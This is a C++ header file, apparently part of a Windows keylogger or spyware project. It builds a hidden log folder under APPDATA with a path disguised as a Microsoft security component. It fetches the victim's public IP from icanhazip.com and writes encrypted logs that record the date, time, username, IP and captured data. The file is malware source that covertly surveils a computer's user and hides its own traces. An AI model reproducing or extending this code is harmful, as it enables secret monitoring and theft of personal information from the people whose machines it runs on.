#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Auxiliary.h"
#include "Encryption.h"
#include <Lmcons.h>
#include <wininet.h>
#include <iostream>

#include <locale>

#pragma comment(lib, "wininet")

namespace IO
{
    std::string GetOurPath(const bool append_seperator = false)
    {
        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR Security Config\\v2.1.30541.467";
        return full + (append_seperator ? "\\" : "");
    }

    bool MkOneDr(std::string path)
    {
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }

    void RmDir(std::string path)
    {
        remove(path.c_str());
    }

    bool MKDir(std::string path)
    {
        for(char &c : path)
            if( c == '\\')
            {
                c = '\0';
                if(!MkOneDr(path))
                    return false;
                c = '\\';
            }
        return true;
    }
    std::string Get_UserName()
    {
        char username[UNLEN+1];
        DWORD username_len = UNLEN+1;
        GetUserName(username, &username_len);

        return username;
    }

    template <class T>
    std::string WriteLog(const T &t)
    {
        std::string path = GetOurPath(true);
        Auxiliary::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + ".log";


        try
        {
            HINTERNET hInternet, hFile;
            DWORD rSize;
            char buffer[47];

            hInternet = InternetOpen(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
            hFile = InternetOpenUrlA(hInternet, "http://icanhazip.com/", NULL, 0, INTERNET_FLAG_RELOAD, 0);
            InternetReadFile(hFile, &buffer, sizeof(buffer), &rSize);
            buffer[rSize] = '\0';

            InternetCloseHandle(hFile);
            InternetCloseHandle(hInternet);

            std::ofstream file(path + name);
            if(!file) return "";
            std::ostringstream s;
            s << "DATE: " << dt.GetDateString() << " \n"
              << "TTME: " << dt.Get_TimeString() << " \n"
              << "USERNAME: " << Get_UserName() << " \n"
              << "IP: "<< buffer <<
            std::endl << t << std::endl;
            //std::string data = Base64 :: EncryptB64(s.str());
            std::string data = s.str();
            std::string encoded = EncryptMix(data);
            file << encoded;
            //std::string data = s.str();
            //file << data;
            if(!file)
                return "";
            file.close();
            return name;
        }
        catch(...)
        {
            return "";
        }
    }

}

#endif // IO_H
